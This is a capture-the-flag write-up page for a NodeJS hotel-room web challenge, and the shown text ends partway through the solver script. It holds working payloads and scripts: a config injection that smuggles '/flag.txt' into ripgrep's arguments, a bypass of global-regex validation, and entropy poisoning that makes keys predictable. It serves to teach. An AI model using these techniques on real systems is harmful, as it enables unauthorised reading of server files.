@@ -1,0 +1,739 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF writeups</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/posts.css">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+</head>
+<body>
+    <!-- Header will be loaded here -->
+    <div id="header-placeholder"></div>
+    <div class="main-content">
+        <div class="container">
+<h4 id="challenge-details">Challenge details</h4>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Category</strong></td>
+<td>Web</td>
+</tr>
+<tr>
+<td><strong>Challenge Type</strong></td>
+<td>Single</td>
+</tr>
+<tr>
+<td><strong>Points</strong></td>
+<td>10</td>
+</tr>
+<tr>
+<td><strong>Author</strong></td>
+<td><code>Linkster78</code></td>
+</tr>
+<tr>
+<td><strong>Original Solver</strong></td>
+<td><code>labubu sauce graine</code> (willi34)</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>6/10</td>
+</tr>
+</tbody>
+</table>
+<h4 id="overview">Overview</h4>
+<p>We are given source code for a NodeJS application used to store and manage hotel rooms and their keys. Clients can check if their rooms have been breached by providing their room code and their room key. If the client's rooms have been breached, they have the option to use their room code (which gets added to the set of rooms even if it didn't exist initially) to generate a new room key. The flag is inside <code>/flag.txt</code> and is made up of hexadecimal characters.</p>
+<p>The app starts off by importing the required modules and setting/population variables used later in the code : </p>
+<pre class="codehilite"><code class="language-js">const Fastify = require('fastify');
+const fastifyStatic = require('@fastify/static');
+const fastifyMiddie = require('@fastify/middie');
+const child_process = require('node:child_process');
+const fs = require('node:fs');
+const path = require('node:path');
+const tmp = require('tmp');
+const { EntropyPool } = require('./random');
+
+
+const CHAR_BLACKLIST = /[^\d]/g;
+const ENTROPY_POOL = new EntropyPool(256);
+const ROOM_KEYS = new Map();
+
+/* seed data code|key */
+ROOM_KEYS.set('CBG:13' , '393391c8ed6194e1');
+ROOM_KEYS.set('CBG:200', 'cbe32befb6599df6');
+ROOM_KEYS.set('CBG:582', '209fbe997f83affc');
+</code></pre>
+
+<p>It then contains functions used for validating client input in the request sent to check the breach. The room code has to start with <code>CBG:</code> and has to follow with digits only (via the regex pattern stored in <code>CHAR_BLACKLIST</code>). The room key used in the request has to belong to the provided room code as well :</p>
+<pre class="codehilite"><code class="language-js">function validateRoomCode(roomCode) {
+    if(!roomCode.startsWith('CBG:')) return false;
+    if(CHAR_BLACKLIST.test(roomCode.substring(4))) return false; 
+    return true;
+}
+
+function validateRoomKey(roomCode, roomKey) {
+    if(!ROOM_KEYS.has(roomCode)) return false;
+    if(ROOM_KEYS.get(roomCode) != roomKey) return false;
+    return true;
+}
+</code></pre>
+
+<p>To check if the room's been breached, the application takes the provided room code and inserts it directly into a configuration file. This file is used to set parameters for the <code>ripgrep</code> tool, a recursive regex-based version of <code>grep</code> :</p>
+<pre class="codehilite"><code class="language-js">async function checkBreached(roomCode) {
+    const configTemplate = fs.readFileSync('template.cfg').toString();
+    const config = Buffer.from(configTemplate.replace('%s', roomCode));
+
+    const configFile = tmp.fileSync();
+    fs.writeSync(configFile.fd, config);
+
+    const searchProc = child_process.spawn('/usr/bin/rg', ['breached-rooms.lst.gz'], {
+        env: { 'RIPGREP_CONFIG_PATH': configFile.name }
+    });
+
+    const exitCode = await new Promise((resolve, _) =&gt; searchProc.on('close', resolve));
+
+    configFile.removeCallback();
+
+    switch(exitCode) {
+        case 0:
+            return true;
+        case 1:
+            return false;
+        default:
+            throw new Error();
+    }
+}
+</code></pre>
+
+<p>The configuration template file is provided in the challenge files and looks like this, where the <code>%s</code> is where the room code is inserted :</p>
+<pre class="codehilite"><code>--pretty
+--search-zip
+--case-sensitive
+--encoding=utf-8
+--engine=pcre2
+--line-regexp
+%s
+</code></pre>
+
+<p>This basically tells <code>ripgrep</code> to search a compressed file for the pattern that will be inserted into <code>%s</code> such that it follows <code>^%s$</code>, matching the entire line. This means that it will look for our room code exactly inside the archive.</p>
+<p>This file is generated during the container building process. Before the app is even inserted into the container, a bash script creates a bunch of room codes and compresses them into an archive :</p>
+<pre class="codehilite"><code>#!/bin/sh
+{
+node - &lt;&lt;'__EOF__'
+for(let i = 1; i &lt;= 100000; i++) {
+    if(Math.random() &lt; 0.5) console.log(`CBG:${i}`);
+}
+__EOF__
+} | gzip &gt; breached-rooms.lst.gz
+</code></pre>
+
+<p>Back to the main app, the room keys are randomly taken from the custom entropy pool imported as a module and converted into hexadecimal :</p>
+<pre class="codehilite"><code class="language-js">function resetRoomKey(roomCode) {
+    const newRoomKey = toHexString(ENTROPY_POOL.getRandomBytes(8));
+    console.log(&quot;[+] ROOM KEY IS : &quot; + newRoomKey);
+    ENTROPY_POOL.reseed();
+
+    ROOM_KEYS.set(roomCode, newRoomKey);
+}
+</code></pre>
+
+<p>On top of that, middleware is used to capture the user agent, URL and body of each request sent to the server. This information is concatenated into a string and converted into bytes to be added into the entropy pool, adding randomness to the bytes chosen for the keys :</p>
+<pre class="codehilite"><code class="language-js">/* web server */
+const fastify = Fastify({
+    logger: true
+});
+
+fastify.register(fastifyStatic, {
+    root: path.join(__dirname, 'public')
+});
+
+fastify.register(fastifyMiddie);
+
+fastify.addHook('onRequest', async (req, _) =&gt; {
+    const userAgent = req.headers['user-agent'] || '';
+    const url = req.url || '';
+    const body = req.body || '';
+
+    const entropy = Buffer.from(`${Date.now()}${userAgent}${url}${body}`);
+    ENTROPY_POOL.addEntropy(entropy);
+});
+</code></pre>
+
+<p>We then have the endpoints for the actual breach check and the key reset requests. The breach check endpoint takes the room code and the room key, validates the code format and that the key belongs to it, and then calls the <code>checkBreached</code> function with the room code :</p>
+<pre class="codehilite"><code class="language-js">fastify.post('/api/check', {
+    handler: async (req, reply) =&gt; {
+        const { roomCode, roomKey } = req.body;
+
+        if(!validateRoomCode(roomCode)) {
+            reply.status(400).send({ error: 'invalid room code, must follow format CBG:&lt;room_number&gt;' });
+            return;
+        }
+
+        if(!validateRoomKey(roomCode, roomKey)) {
+            reply.status(401).send({ error: 'incorrect room key' });
+            return;
+        }
+        // Meaning the room key has to be valid to check breach
+        try {
+            const isBreached = await checkBreached(roomCode);
+            reply.status(200).send({ breached: isBreached });
+        } catch {
+            reply.status(500).send({ error: 'an internal error has occurred' })
+        }
+    },
+    schema: {
+        body: {
+            type: 'object',
+            required: ['roomCode', 'roomKey'],
+            properties: {
+                roomCode: {
+                    type: 'string',
+                    minLength: 4,
+                    maxLength: 24
+                },
+                roomKey: {
+                    type: 'string',
+                    minLength: 16,
+                    maxLength: 16
+                }
+            }
+        }
+    }
+});
+</code></pre>
+
+<p>The reset endpoint only takes the room code and calls the <code>resetRoomKey</code> function with it :</p>
+<pre class="codehilite"><code class="language-js">fastify.post('/api/reset', {
+    handler: async (req, reply) =&gt; {
+        const { roomCode } = req.body;
+        resetRoomKey(roomCode);
+
+        reply.status(200).send({});
+    },
+    schema: {
+        body: {
+            type: 'object',
+            required: ['roomCode'],
+            properties: {
+                'roomCode': {
+                    type: 'string',
+                    minLength: 4,
+                    maxLength: 24
+                }
+            }
+        }
+    }
+})
+
+const start = async () =&gt; {
+    try {
+        await fastify.listen({
+            host: '0.0.0.0',
+            port: 3000
+        });
+    } catch(err) {
+        fastify.log.error(err);
+        process.exit(1);
+    }
+};
+start();
+</code></pre>
+
+<p>The code paints a pretty clear picture of what we have to do :</p>
+<ol>
+<li>Find a way to inject something into the <code>ripgrep</code> configuration file through the room code to search inside another file (<code>/flag.txt</code>) while controlling the regex. We'll be able to determine each character of the flag with our regex, such that every time a pattern is right the application returns the room as breached</li>
+<li>Get around the validation of the room code to inject our payload from 1</li>
+<li>Somehow poison the entropy pool with our requests in order to be able to guess the random key generated for our room code. We need to get the right room key in order to trigger the <code>checkBreached</code> function which contains the <code>ripgrep</code> command</li>
+</ol>
+<h4 id="configuration-template-injection">Configuration template injection</h4>
+<p>First, we have to find a way to get <code>ripgrep</code> to search inside other files. We have two possibilities to consider for our injection point : injecting something before the room code and after. We'll test these possibilities by replicating the command on our host and making our own configuration template. </p>
+<p>If we inject something before the room code, our injection becomes the regex pattern, and the room code....... Gets taken as another file to search from! :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/hotel]
+└─$ cat template.cfg               
+--pretty
+--search-zip
+--case-sensitive
+--encoding=utf-8
+--engine=pcre2
+--line-regexp
+injected_line
+CBG:123
+
+┌──(kali㉿kali)-[~/united/hotel]
+└─$ RIPGREP_CONFIG_PATH=./template.cfg rg unique.txt 
+rg: CBG:123: No such file or directory (os error 2)
+</code></pre>
+
+<p>This means anything we inject after the room code becomes a new file to search from, meaning we could inject <code>\n/flag.txt</code> and the end of our room code to search inside the flag file. </p>
+<p>Next, we'll need to control the regex to be able to match the characters in the file. One option would be to inject our pattern before the room code and the arbitrary file after, but this is not guaranteed to work (because of the validation of the room code). Instead, it would be nice to be able to add our arbitrary regex after the room code on the same line, and inject the filename on a new line after. For this, we can use the <code>or</code> operator <code>|</code> inside our pattern.</p>
+<p>For example, if we wanted to search for two patterns at the same time and wanted to match either one, we could use something like :</p>
+<pre class="codehilite"><code>CBG:test|f.*
+</code></pre>
+
+<p>This works in the configuration file as well :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/hotel]
+└─$ cat flag.txt     
+flag
+
+┌──(kali㉿kali)-[~/united/hotel]
+└─$ cat template.cfg 
+--pretty
+--search-zip
+--case-sensitive
+--encoding=utf-8
+--engine=pcre2
+--line-regexp
+CBG:test|f.*
+flag.txt
+
+┌──(kali㉿kali)-[~/united/hotel]
+└─$ RIPGREP_CONFIG_PATH=./template.cfg rg unique.txt
+flag.txt
+1:flag
+</code></pre>
+
+<p>It's worth noting that the <code>--line-regexp</code> still matches each of our regex patterns as the entire line, meaning each pattern is read like so : </p>
+<pre class="codehilite"><code>^CBG:test$
+^f.*$
+</code></pre>
+
+<p>If we ever find a way to get around the room code validation method, we'll be able to start enumerating characters of the flag by using the presence of result to check when our condition is true :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/hotel]
+└─$ cat template.cfg 
+--pretty
+--search-zip
+--case-sensitive
+--encoding=utf-8
+--engine=pcre2
+--line-regexp
+CBG:test|fl.*
+flag.txt
+
+┌──(kali㉿kali)-[~/united/hotel]
+└─$ RIPGREP_CONFIG_PATH=./template.cfg rg unique.txt
+flag.txt
+1:flag
+</code></pre>
+
+<p>Example with a regex pattern that doesn't match our flag :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/hotel]
+└─$ cat template.cfg 
+--pretty
+--search-zip
+--case-sensitive
+--encoding=utf-8
+--engine=pcre2
+--line-regexp
+CBG:test|fe.*
+flag.txt
+
+┌──(kali㉿kali)-[~/united/hotel]
+└─$ RIPGREP_CONFIG_PATH=./template.cfg rg unique.txt
+
+┌──(kali㉿kali)-[~/united/hotel]
+└─$ 
+</code></pre>
+
+<p>Since the flag is made up entirely of 16 possible characters (hexadecimal), this approach feasible.</p>
+<h4 id="room-code-validation-bypass">Room code validation bypass</h4>
+<p>We now have to get around the room code validation that checks the string to see if it starts with <code>CBG:</code> and ends with digits :</p>
+<pre class="codehilite"><code class="language-js">const CHAR_BLACKLIST = /[^\d]/g;
+
+function validateRoomCode(roomCode) {
+    if(!roomCode.startsWith('CBG:')) return false;
+    if(CHAR_BLACKLIST.test(roomCode.substring(4))) return false; 
+    return true;
+}
+</code></pre>
+
+<p>The validation for the start of the room code looks very sound, so it doesn't look like we'll be able to use a trick to inject something before the room code. The regex used to check for digits is much more interesting. In order to bypass it, we'll need to fully understand what it does. </p>
+<p>The usage of <code>[]</code> in regex represents a character class. The <code>^</code> inside will have its meaning changed because of this, and will represent a negation instead. The character class will match everything except for whatever follows the negation, which in this case is the shorthand for any digit. If the regex matches, it means other characters inside the string aside from digits were found, and so <code>False</code> is returned and the room code isn't accepted.</p>
+<p>The <code>/g</code> option, called global, is used to search all matches within the string as opposed to just finding the first match and ending. The regex that checks for digits looks good, but could there be a way to exploit the global search to sneak in a few characters?</p>
+<p>Searching for <strong>node.js global search bug</strong> reveals <a href="https://stackoverflow.com/questions/10229144/bug-with-regexp-in-javascript-when-do-global-search">this</a> Stack Overflow post, which explains that the <code>RegExp</code> object has a <code>lastIndex</code> property that remembers the last value matched with <code>test()</code> when the global mode is used. The next time the function is called, the regex is checked starting from that last index. If no match is found, then the index is reset to 0.</p>
+<p>Take this script for example :</p>
+<pre class="codehilite"><code class="language-js">const CHAR_BLACKLIST = /[^\d]/g;
+
+function validateRoomCode(roomCode) {
+    const sliced = roomCode.substring(4); 
+    const result = !CHAR_BLACKLIST.test(sliced);
+    console.log(`[validateRoomCode] Checking: &quot;${sliced}&quot; at index ${CHAR_BLACKLIST.lastIndex}`);
+    return result;
+}
+
+function sendRoomCode(roomCode) {
+    const valid = validateRoomCode(roomCode);
+    console.log(`[sendRoomCode] &quot;${roomCode}&quot; -&gt; ${valid ? 'VALID' : 'BLOCKED'}\n`);
+}
+// Initial index at 0
+console.log(CHAR_BLACKLIST.lastIndex)
+
+// Displace index using safe characters, the 'a' is matched at position 16 (substring minus CBG:)
+sendRoomCode(&quot;CBG:111111111111111a&quot;);
+console.log(CHAR_BLACKLIST.lastIndex)
+
+// Send a payload that would normally be blocked at index 0, it passes because it starts at position 16
+sendRoomCode(&quot;CBG:|f.*\n/flag.txt&quot;);
+// The index should now return to 0, since no matches for anything other than digits will occur
+console.log(CHAR_BLACKLIST.lastIndex)
+</code></pre>
+
+<p>We see that we are indeed able to displace the last index of the <code>RegExp</code> object to sneak in a payload that would normally be disallowed :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/hotel]
+└─$ node test-regexp.js
+0
+[validateRoomCode] Checking: &quot;111111111111111a&quot; at index 16
+[sendRoomCode] &quot;CBG:111111111111111a&quot; -&gt; BLOCKED
+
+16
+[validateRoomCode] Checking: &quot;|f.*
+/flag.txt&quot; at index 0
+[sendRoomCode] &quot;CBG:|f.*
+/flag.txt&quot; -&gt; VALID
+
+0
+</code></pre>
+
+<p>We can test the same thing on the application just to make sure :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/hotel/server-dist]
+└─$ curl -X POST http://localhost:3000/api/check -H 'Content-Type: application/json' -d '{&quot;roomCode&quot;:&quot;CBG:hihi&quot;, &quot;roomKey&quot;:&quot;1234567890123245&quot;}'
+{&quot;error&quot;:&quot;invalid room code, must follow format CBG:&lt;room_number&gt;&quot;}                                                                                                                                                                     
+┌──(kali㉿kali)-[~/united/hotel/server-dist]
+└─$ curl -X POST http://localhost:3000/api/check -H 'Content-Type: application/json' -d '{&quot;roomCode&quot;:&quot;CBG:1111a&quot;, &quot;roomKey&quot;:&quot;1234567890123245&quot;}'
+{&quot;error&quot;:&quot;invalid room code, must follow format CBG:&lt;room_number&gt;&quot;}                                                                                                                                                                     
+┌──(kali㉿kali)-[~/united/hotel/server-dist]
+└─$ curl -X POST http://localhost:3000/api/check -H 'Content-Type: application/json' -d '{&quot;roomCode&quot;:&quot;CBG:hihi&quot;, &quot;roomKey&quot;:&quot;1234567890123245&quot;}' 
+{&quot;error&quot;:&quot;incorrect room key&quot;} 
+</code></pre>
+
+<p>This means we can inject our payload into the configuration template as long as we send a dummy request beforehand that will displace the last index to a position that doesn't match any of our characters.</p>
+<h4 id="attacking-the-entropy">Attacking the entropy</h4>
+<p>The last hurdle to get through is the room key generation. In order to get to the function that calls <code>ripgrep</code>, we'll need the reset the room key for our malicious room code and correctly guess it.</p>
+<p>We can see that the entropy pool is implemented inside another JavaScript file :</p>
+<pre class="codehilite"><code class="language-js">const { EntropyPool } = require('./random');
+</code></pre>
+
+<p>This file is provided to us in the challenge files as well :</p>
+<pre class="codehilite"><code class="language-js">const crypto = require('node:crypto');
+
+class EntropyPool {
+    constructor(size) {
+        this.size = size;
+        this.cursor = 0;
+        this.reseed();
+    }
+    // Initialize the entropy pool with random bytes generated from the crypto module 
+    reseed() {
+        this.buffer = crypto.randomBytes(this.size);
+    }
+    // Adds bytes into the buffer by replacing each index in a loop, uses modulo operation to avoid going out of bounds 
+    addEntropy(data) {
+        for(let i = 0; i &lt; data.length; i++) {
+            this.buffer[this.cursor++ % this.size] = data[i];
+        }
+    }
+    // Takes random bytes out of the buffer using Math.random()
+    getRandomBytes(length) {
+        const data = new Uint8Array(length);
+        for(let i = 0; i &lt; data.length; i++) {
+            const sampled = this.buffer[Math.floor(Math.random() * this.buffer.length)];
+            data[i] = sampled;
+        }
+        return data;
+    }
+}
+
+module.exports = { EntropyPool }
+</code></pre>
+
+<p>The entropy implementation stores bytes into a buffer. It has a function to initialize the buffer with random bytes from the <code>crypto</code> module. It adds entropy to the buffer by overwriting its bytes with new ones and wraps around to avoid going out of bounds. The "random" bytes are then taken from this buffer randomly using the <code>Math.random</code> function.</p>
+<p>I'm no crypto wizard, but there's a pretty obvious problem here. The bytes that get added into the pool are mostly controlled by us through the HTTP requests sent to the application. If we sent a bunch of the same bytes into the buffer, then the resulting generated key would likely be entirely made up hexadecimal characters representing this byte. </p>
+<p>We can test this by adding a function to the <code>random.js</code> file that will dump the buffer :</p>
+<pre class="codehilite"><code class="language-js">// Custom method for debugging
+dumpBuffer() {
+const hexString = Array.from(this.buffer)
+    .map(byte =&gt; `0x${byte.toString(16).padStart(2, '0')}`)
+    .join(', ');
+
+console.log(`[*] Entropy Pool Dump:\n[ ${hexString} ]`);
+}
+</code></pre>
+
+<p>The function will be added inside the middleware that hooks into every request :</p>
+<pre class="codehilite"><code class="language-js">fastify.addHook('onRequest', async (req, _) =&gt; {
+    const userAgent = req.headers['user-agent'] || '';
+    const url = req.url || '';
+    const body = req.body || '';
+
+    const entropy = Buffer.from(`${Date.now()}${userAgent}${url}${body}`);
+    ENTROPY_POOL.addEntropy(entropy);
+    // Debug added by us
+    console.log(&quot;Here are the specs. UA is &quot; + userAgent + &quot; | URL is &quot; + url + &quot; | Body is &quot; + body);
+    ENTROPY_POOL.dumpBuffer();
+});
+</code></pre>
+
+<p>The first value I tested was the user agent, so I stuck with it (there are multiple, better ways of doing this by injecting into the URL or body however : the author was even able to get an accuracy rate of 100% by injecting a query parameter). We can test this while trying to reset a key for a room :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/hotel/server-dist]
+└─$ curl -X POST http://localhost:3000/api/reset -H 'User-Agent: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' -H 'Content-Type: application/json' -d '{&quot;roomCode&quot;:&quot;CBG:1337&quot;}' -i
+</code></pre>
+
+<p>The entropy pool is indeed filled (mostly!) with 'A' bytes, and so is the generated key :</p>
+<pre class="codehilite"><code>hotel-server  | [+] ROOM KEY IS : 4141414141414141
+hotel-server  | [*] Entropy Pool Dump:
+hotel-server  | [ 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x2f, 0x61, 0x70, 0x69, 0x2f, 0x72, 0x65, 0x73, 0x65, 0x74, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41 ]
+hotel-server  | Current ROOM_KEYS:
+hotel-server  | CBG:13 =&gt; 393391c8ed6194e1
+hotel-server  | CBG:200 =&gt; cbe32befb6599df6
+hotel-server  | CBG:582 =&gt; 209fbe997f83affc
+hotel-server  | CBG:1337 =&gt; 4141414141414141
+hotel-server  | {&quot;level&quot;:30,&quot;time&quot;:1759427498079,&quot;pid&quot;:1,&quot;hostname&quot;:&quot;3f57dbb7d005&quot;,&quot;reqId&quot;:&quot;req-2&quot;,&quot;res&quot;:{&quot;statusCode&quot;:200},&quot;responseTime&quot;:3.4849470015615225,&quot;msg&quot;:&quot;request completed&quot;}
+</code></pre>
+
+<p>Verification :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/hotel/server-dist]
+└─$ curl -X POST http://localhost:3000/api/check -H 'Content-Type: application/json' -d '{&quot;roomCode&quot;:&quot;CBG:1337&quot;, &quot;roomKey&quot;:&quot;4141414141414141&quot;}'
+
+{&quot;breached&quot;:true} 
+</code></pre>
+
+<p>With this, we have every piece of the puzzle solved.</p>
+<h4 id="regex-fine-tuning">Regex fine-tuning</h4>
+<p>So off I went to write my solution script all excited. There was just one problem. I had completely forgot about the character limit imposed on the room code! The web framework in use (<code>Fastify</code>) limits the number of characters inside the room code to 24 on incoming requests :</p>
+<pre class="codehilite"><code class="language-js">fastify.post('/api/check', {
+    handler: async (req, reply) =&gt; {
+        const { roomCode, roomKey } = req.body;
+
+        if(!validateRoomCode(roomCode)) {
+            reply.status(400).send({ error: 'invalid room code, must follow format CBG:&lt;room_number&gt;' });
+            return;
+        }
+
+        if(!validateRoomKey(roomCode, roomKey)) {
+            reply.status(401).send({ error: 'incorrect room key' });
+            //debug lines added by me
+            console.log(&quot;[+] YOUR ROOM KEY : &quot; + roomKey);
+            console.log(&quot;[+] ACTUAL ROOM KEY : &quot; + ROOM_KEYS.get('CBG:13'));
+            return;
+        }
+        //room key has to be valid to check breach
+        try {
+            const isBreached = await checkBreached(roomCode);
+            reply.status(200).send({ breached: isBreached });
+        } catch {
+            reply.status(500).send({ error: 'an internal error has occurred' })
+        }
+    },
+    schema: {
+        body: {
+            type: 'object',
+            required: ['roomCode', 'roomKey'],
+            properties: {
+                roomCode: {
+                    type: 'string',
+                    minLength: 4,
+                    maxLength: 24 // &lt;---------- HERE!
+                },
+                roomKey: {
+                    type: 'string',
+                    minLength: 16,
+                    maxLength: 16
+                }
+            }
+        }
+    }
+});
+</code></pre>
+
+<p>With our current regex setup of guessing the next character in a <code>f&lt;char&gt;.*</code> fashion, we'll run out of allowed characters pretty quick since we're also injecting a newline and a filename. <code>CBG:|</code> takes 5 characters, and <code>\n/flag.txt</code> already takes 10, leaving us 9 characters to work with. This means we won't be able to use the actual characters of the flag in the regex to determine which character comes next.</p>
+<p>No worries though, since we can just look for a specific character at a specific index in the string using repetitions. For example take this regex pattern :</p>
+<pre class="codehilite"><code>^.{0}f.*$
+</code></pre>
+
+<p>This pattern will match a string starting with one instance of 0 characters followed by the character 'f', then ending with 0 or more instances of any character. Take this next pattern :</p>
+<pre class="codehilite"><code>^.{1}l.*$
+</code></pre>
+
+<p>This one will match a string starting with 1 instance of any character (which in our case, is the 'f') followed by the character 'l' and ending with 0 or more instances of any character. </p>
+<p>See where I'm going with this? We can now extract the flag by using a regex pattern that will, at most, use 8 characters (since we can assume the flag is longer than 10 characters, the number inside the "index" position will need to take 2 digits to represent).</p>
+<p>Verification :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/hotel]
+└─$ cat template.cfg        
+--pretty
+--search-zip
+--case-sensitive
+--encoding=utf-8
+--engine=pcre2
+--line-regexp
+CBG:|.{0}f.*
+flag.txt
+
+┌──(kali㉿kali)-[~/united/hotel]
+└─$ RIPGREP_CONFIG_PATH=./template.cfg rg unique.txt
+flag.txt
+1:flag
+</code></pre>
+
+<p>Challenge solved! I adjusted my script, fired at my local instance, and............ </p>
+<p>The application hangs after a while, and we get no response.</p>
+<p>I ignored this, fired my script at the spawned instance, and............</p>
+<p>The application hangs again. Oh dear.</p>
+<p>So what happened? I don't even know. The only observation I made was that the only time the application hanged was when my regex pattern hit something like :</p>
+<pre class="codehilite"><code>CBG:|.{5}&lt;digit&gt;.*
+</code></pre>
+
+<p>This could only mean one thing : Our regex pattern was now matching the format of some of the entries already present (<code>CBG:&lt;digits&gt;</code>) within the compressed archive. <strong>ChatGPT</strong> gives us a pretty plausible explanation as to why the application hangs in this case :</p>
+<pre class="codehilite"><code>What is the OS pipe buffer?
+
+A pipe is an OS-provided kernel object that lets one process send bytes to another process. When you spawn a child process and leave its stdout/stderr connected to the parent, the kernel creates a pipe between the child’s writer end and the parent’s reader end.
+
+That pipe has a fixed-size kernel buffer (on many Linux systems the default is around 64 KB, but it can vary). The child writes into that buffer with write() system calls; the parent reads from it with read().
+
+How a full pipe buffer causes a hang
+
+If the child writes more bytes than the pipe buffer can hold and the parent is not reading (or reads too slowly), the kernel will block the child’s write() call until buffer space free up.
+
+If the parent is waiting for the child to exit (e.g. await on a 'close' event) but the child is blocked on write() because the parent never drained the pipe, then neither process progresses. From the client’s point of view the server appears to hang (it never sends a response).
+
+This is classic backpressure behavior — the producer (child) must be consumed or it will block.
+</code></pre>
+
+<p>Indeed, this issue can be fixed by making sure none of the entries within the archive match with our regex pattern at any point. Luckily for us, we still have one character to spare in our room code (5 + 10 + 8 = 23). Fixing this is as simple as forcing the first character to match the 'f' character, which is only seen in the flag file :</p>
+<pre class="codehilite"><code>CBG:|f.{0}l.*
+</code></pre>
+
+<p>Verification :</p>
+<pre class="codehilite"><code>┌──(kali㉿kali)-[~/united/hotel]
+└─$ cat template.cfg 
+--pretty
+--search-zip
+--case-sensitive
+--encoding=utf-8
+--engine=pcre2
+--line-regexp
+CBG:|f.{0}l.*
+flag.txt
+
+┌──(kali㉿kali)-[~/united/hotel]
+└─$ RIPGREP_CONFIG_PATH=./template.cfg rg unique.txt
+flag.txt
+1:flag
+</code></pre>
+
+<h4 id="final-solution">Final solution</h4>
+<p>Here's the final script that automates everything we've done so far to extract each character of the flag. The entropy pool corruption part via the user-agent had to be repeated in a loop until the right key was created since some bytes from the current time kept sneaking into the pool :</p>
+<pre class="codehilite"><code class="language-python">import requests
+
+# Requests variables for the dummy attack and the validation
+headers = {
+   'User-Agent': 'A' * 300
+}
+
+# Constant variables
+URL = 'https://hotel-hell-eb1876f303.challenges.unitedctf.ca'
+CHARSET = &quot;abcdef1234567890&quot;
+ROOMKEY = '4141414141414141'
+# Starting the flag early to reduce time load
+FLAG = &quot;flag-&quot;
+
+def send_request(roomCode):
+   data = {
+      'roomCode': roomCode,
+      'roomKey': ROOMKEY   
+   }
+   r = requests.post(URL + &quot;/api/check&quot;, json=data)
+   return r
+
+# Sends the reset request and checks if entropy corruption succeeded
+def reset(roomCode):
+   data = {
+      'roomCode': roomCode 
+   }
+
+   # Debug for length
+   print(&quot;[+] Room code length : &quot; + str(len(roomCode)))
+   for i in range(20):  # Retry loop
+      r = requests.post(URL + &quot;/api/reset&quot;, json=data, headers=headers)
+      print(r.text)
+      if r.status_code == 200:
+         print(&quot;[+] Reset key&quot;)
+         verified = send_request(roomCode)
+         print(verified.text)
+         if &quot;room&quot; not in verified.text.lower():
+            print(&quot;[+] Corruption successful!&quot;)
+            if &quot;true&quot; in verified.text:
+               return True
+            else:
+               break
+         else:
+            print(&quot;[-] Could not get a valid room key, trying again&quot;)
+   return False
+
+def attack():
+   not_found = True
+   flag = FLAG
+
+   # Value used inside the regex (we already have 4 chars of the flag, we so start at index 5. Then, we include the 'f' char in the regex, so minus 1)
+   index = 4
+   while not_found:
+      found = False
